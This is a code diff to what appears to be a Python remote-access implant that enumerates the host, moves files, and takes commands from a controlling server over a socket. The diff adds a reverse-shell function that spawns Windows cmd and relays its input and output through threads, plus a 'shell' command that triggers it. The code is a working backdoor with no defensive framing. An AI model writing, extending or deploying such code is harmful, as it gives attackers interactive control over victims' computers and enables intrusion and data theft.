@@ -3,6 +3,7 @@
 import socket,time
 import platform
 import getpass
+import subprocess, threading
 
 def enume():
     hostname = socket.gethostname()
@@ -47,6 +48,39 @@ def upload():
     file.close()
     print("File sent succesfully!")
 
+def rev_shell(socket):
+    
+
+    def s2p(s, p):
+        while True:
+            data = s.recv(1024)
+            if data == 'exit':
+                s.close()
+                break
+            if len(data) > 0 :
+                p.stdin.write(data)
+                p.stdin.flush()
+
+    def p2s(s, p):
+        while True:
+            s.send(p.stdout.read(1))
+
+    s = socket
+
+    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+    s2p_thread = threading.Thread(target=s2p, args=[s, p])
+    s2p_thread.daemon = True
+    s2p_thread.start()
+
+    p2s_thread = threading.Thread(target=p2s, args=[s, p])
+    p2s_thread.daemon = True
+    p2s_thread.start()
+
+    try:
+        p.wait()
+    except KeyboardInterrupt:
+        s.close()
 
 while 1:
     command = s.recv(409600).decode()
@@ -58,6 +92,10 @@ while 1:
             download(from_= command[1])
         case 'upload':
             upload()
+        case 'shell':
+            print("line 93")
+            time.sleep(3)
+            rev_shell(socket=s)
 
 
 
